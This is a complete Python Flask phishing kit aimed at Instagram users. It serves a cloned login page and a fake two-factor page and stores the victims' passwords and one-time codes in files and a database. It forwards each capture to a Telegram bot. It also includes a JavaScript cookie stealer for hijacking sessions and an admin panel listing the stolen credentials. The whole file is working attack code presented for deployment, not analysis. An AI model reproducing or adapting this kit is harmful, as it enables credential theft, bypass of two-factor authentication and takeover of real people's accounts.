#!/usr/bin/env python3
"""
Instagram Phishing Kit - Python Flask
Full credential harvesting with 2FA bypass and session theft
"""

import os
import json
import sqlite3
import hashlib
import logging
from datetime import datetime
from flask import Flask, request, redirect, render_template_string, make_response
from flask_cors import CORS
import requests
from urllib.parse import urlparse, parse_qs

# --- Configuration ---
LOG_FILE = 'creds.txt'
IP_LOG = 'ip_log.txt'
SESSION_LOG = 'sessions.txt'
REAL_INSTAGRAM = 'https://www.instagram.com/accounts/login/'
PORT = 5000
DEBUG = False

# --- Flask Setup ---
app = Flask(__name__)
CORS(app)

# --- Logging Setup ---
logging.basicConfig(
    filename='phish.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect('phish.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME,
            session_cookie TEXT,
            twofa_code TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            username TEXT,
            ip TEXT,
            created_at DATETIME,
            active INTEGER DEFAULT 1
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# --- HTML Templates ---
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px 30px; max-width: 350px; width: 100%; border: 1px solid #dbdbdb; border-radius: 1px; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 40px; font-family: 'Billabong', cursive; }
        .input-group { margin-bottom: 8px; }
        .input-group input { width: 100%; padding: 10px 8px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; background: #fafafa; }
        .input-group input:focus { border-color: #a8a8a8; outline: none; }
        .btn { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; }
        .btn:hover { background: #0077d6; }
        .divider { display: flex; align-items: center; margin: 18px 0; }
        .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
        .divider-text { padding: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #8e8e8e; }
        .footer a { color: #00376b; text-decoration: none; font-weight: 600; }
        .error { color: #ed4956; font-size: 13px; margin-bottom: 12px; text-align: center; display: none; }
        .twofa-section { display: none; }
        .twofa-section.active { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        
        <div id="errorMsg" class="error">Sorry, your password was incorrect. Please double-check your password.</div>
        
        <form id="loginForm" method="POST" action="/login">
            <div class="input-group">
                <input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            
            <button type="submit" class="btn">Log In</button>
        </form>

        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>

        <div class="footer">
            <p><a href="#">Forgot password?</a></p>
            <p style="margin-top: 12px;">Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            var username = document.querySelector('input[name="username"]').value;
            var password = document.querySelector('input[name="password"]').value;
            
            if (!username || !password) {
                e.preventDefault();
                document.getElementById('errorMsg').style.display = 'block';
                return;
            }
            
            // Log submit attempt
            console.log('Login attempt:', username);
        });
    </script>
</body>
</html>
"""

TWOFA_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Two-Factor Authentication</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px 30px; max-width: 350px; width: 100%; border: 1px solid #dbdbdb; border-radius: 1px; }
        .logo { text-align: center; margin-bottom: 24px; font-size: 32px; font-family: 'Billabong', cursive; }
        .desc { text-align: center; color: #262626; font-size: 14px; margin-bottom: 20px; }
        .input-group { margin-bottom: 8px; }
        .input-group input { width: 100%; padding: 10px 8px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; background: #fafafa; text-align: center; letter-spacing: 8px; }
        .btn { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; }
        .btn:hover { background: #0077d6; }
        .error { color: #ed4956; font-size: 13px; margin-bottom: 12px; text-align: center; display: none; }
        .footer { text-align: center; margin-top: 16px; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="desc">Enter the 6-digit code from your authenticator app</div>
        
        <div id="errorMsg" class="error">Invalid code. Please try again.</div>
        
        <form method="POST" action="/2fa">
            <div class="input-group">
                <input type="text" name="code" placeholder="000000" maxlength="6" required autofocus>
            </div>
            <button type="submit" class="btn">Verify</button>
        </form>

        <div class="footer">
            <p><a href="#">Use backup code</a></p>
        </div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function(e) {
            var code = document.querySelector('input[name="code"]').value;
            if (code.length !== 6) {
                e.preventDefault();
                document.getElementById('errorMsg').style.display = 'block';
                return;
            }
        });
    </script>
</body>
</html>
"""

# --- Core Phishing Routes ---
@app.route('/')
def index():
    """Serve the login page"""
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now()
    
    # Log the attempt
    log_entry = f"[{timestamp}] IP: {ip} | USER: {username} | PASS: {password} | UA: {user_agent}\n"
    
    # Write to file
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    # Log IP
    with open(IP_LOG, 'a', encoding='utf-8') as f:
        f.write(f"{timestamp} | {ip} | {username}\n")
    
    # Save to database
    conn = sqlite3.connect('phish.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO credentials (username, password, ip, user_agent, timestamp)
        VALUES (?, ?, ?, ?, ?)
    ''', (username, password, ip, user_agent, timestamp))
    conn.commit()
    
    # Get the ID
    cred_id = c.lastrowid
    conn.close()
    
    # Check if 2FA is enabled (we always ask)
    # Store username for 2FA step
    response = make_response(redirect('/2fa'))
    response.set_cookie('phish_user', username, max_age=300)
    response.set_cookie('phish_cred_id', str(cred_id), max_age=300)
    
    # Send to Telegram/Webhook if configured
    send_telegram_alert(username, password, ip, user_agent)
    
    return response

@app.route('/2fa', methods=['GET', 'POST'])
def twofa():
    """Handle 2FA verification"""
    if request.method == 'GET':
        return render_template_string(TWOFA_PAGE)
    
    # POST - 2FA code submission
    code = request.form.get('code', '')
    username = request.cookies.get('phish_user', 'Unknown')
    cred_id = request.cookies.get('phish_cred_id', '0')
    ip = request.remote_addr
    timestamp = datetime.now()
    
    # Log 2FA code
    with open('2fa_codes.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] IP: {ip} | USER: {username} | 2FA: {code}\n")
    
    # Update database
    conn = sqlite3.connect('phish.db')
    c = conn.cursor()
    c.execute('''
        UPDATE credentials SET twofa_code = ? WHERE id = ?
    ''', (code, cred_id))
    conn.commit()
    conn.close()
    
    # Send 2FA to Telegram
    send_telegram_2fa(username, code, ip)
    
    # Redirect to real Instagram
    response = make_response(redirect('https://www.instagram.com/'))
    
    # Clear cookies
    response.set_cookie('phish_user', '', expires=0)
    response.set_cookie('phish_cred_id', '', expires=0)
    
    return response

# --- Session Hijacking Endpoint ---
@app.route('/capture_session', methods=['POST'])
def capture_session():
    """Capture Instagram session cookies via JavaScript injection"""
    session_data = request.json
    if session_data:
        username = session_data.get('username', 'Unknown')
        session_id = session_data.get('session_id', '')
        ip = request.remote_addr
        
        # Log session
        with open(SESSION_LOG, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now()}] USER: {username} | SESSION: {session_id} | IP: {ip}\n")
        
        # Save to database
        conn = sqlite3.connect('phish.db')
        c = conn.cursor()
        c.execute('''
            INSERT INTO sessions (session_id, username, ip, created_at)
            VALUES (?, ?, ?, ?)
        ''', (session_id, username, ip, datetime.now()))
        conn.commit()
        conn.close()
        
        return {'status': 'success'}, 200
    
    return {'status': 'error'}, 400

# --- Session Cookie Injector ---
@app.route('/inject.js')
def inject_js():
    """JavaScript to steal Instagram session cookies"""
    js_code = """
    // Instagram Session Stealer
    (function() {
        // Get all cookies
        var cookies = document.cookie;
        var username = '';
        
        // Try to get username from page
        var username_el = document.querySelector('span._ap3a._aaco._aacw._aacx._aad7._aade');
        if (username_el) {
            username = username_el.innerText;
        }
        
        // Send to our server
        fetch('/capture_session', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                session_id: cookies,
                url: window.location.href
            })
        });
        
        console.log('[+] Session captured for:', username);
    })();
    """
    return js_code, 200, {'Content-Type': 'application/javascript'}

# --- Admin Panel ---
@app.route('/admin')
def admin():
    """View captured credentials"""
    # Simple auth - change this
    auth = request.headers.get('Authorization')
    if auth != 'Bearer admin123':
        return 'Unauthorized', 401
    
    conn = sqlite3.connect('phish.db')
    c = conn.cursor()
    c.execute('SELECT * FROM credentials ORDER BY id DESC LIMIT 50')
    rows = c.fetchall()
    conn.close()
    
    html = '<h1>Captured Credentials</h1><pre>'
    for row in rows:
        html += f"ID: {row[0]} | User: {row[1]} | Pass: {row[2]} | IP: {row[3]} | 2FA: {row[6]}\n"
    html += '</pre>'
    return html

# --- Telegram Alert Function ---
def send_telegram_alert(username, password, ip, user_agent):
    """Send alert to Telegram bot"""
    bot_token = ''  # Set your bot token
    chat_id = ''    # Set your chat ID
    
    if not bot_token or not chat_id:
        return
    
    message = f"""
🔐 INSTAGRAM CREDENTIALS CAPTURED
👤 Username: {username}
🔑 Password: {password}
🌐 IP: {ip}
📱 User-Agent: {user_agent}
🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(url, json={'chat_id': chat_id, 'text': message})
    except:
        pass

def send_telegram_2fa(username, code, ip):
    """Send 2FA alert to Telegram"""
    bot_token = ''  # Set your bot token
    chat_id = ''    # Set your chat ID
    
    if not bot_token or not chat_id:
        return
    
    message = f"""
🔐 INSTAGRAM 2FA CODE CAPTURED
👤 Username: {username}
🔢 2FA Code: {code}
🌐 IP: {ip}
🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(url, json={'chat_id': chat_id, 'text': message})
    except:
        pass

# --- Main Entry Point ---
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║     INSTAGRAM PHISHING KIT            ║
    ║                                       ║
    ║  [+] Running on port: {}        ║
    ║  [+] Credentials saved to: creds.txt  ║
    ║  [+] Admin panel: /admin              ║
    ║  [+] 2FA capture: enabled             ║
    ╚═══════════════════════════════════════╝
    """.format(PORT))
    
    app.run(host='0.0.0.0', port=PORT, debug=DEBUG)
